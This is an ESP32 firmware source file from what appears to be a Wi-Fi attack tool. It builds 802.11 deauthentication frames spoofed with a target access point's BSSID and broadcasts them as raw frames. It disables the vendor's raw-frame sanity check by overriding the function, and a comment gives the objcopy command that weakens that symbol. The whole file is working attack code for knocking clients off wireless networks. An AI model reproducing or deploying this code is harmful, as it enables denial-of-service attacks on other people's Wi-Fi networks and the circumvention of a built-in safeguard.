#include "WslBypasser/wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#include "esp_log.h"
#include "esp_err.h"

#include "AttackLog/log.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char *TAG = "wsl_bypasser";
/**
 * @brief Deauthentication frame template
 * 
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 * 
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

/**
 * @brief Decomplied function that overrides original one at compilation time.
 * 
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 * 
 * @note run C:\Users\???\.platformio\packages\toolchain-xtensa-esp-elf\bin\xtensa-esp32-elf-objcopy.exe 
 *          --weaken-symbol=ieee80211_raw_frame_sanity_check libnet80211.a libnet80211.a
 */
extern "C" int ieee80211_raw_frame_sanity_check(void* frame, int len) {
    return 0;
}

/**
 * @brief Internal WiFi TX function declaration
 */
extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_seq_netif);

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    if (err != ESP_OK) {
        ATTACK_LOG_E(TAG, "TX fail: 0x%x", err);
    }
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
    ATTACK_LOG_D(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}
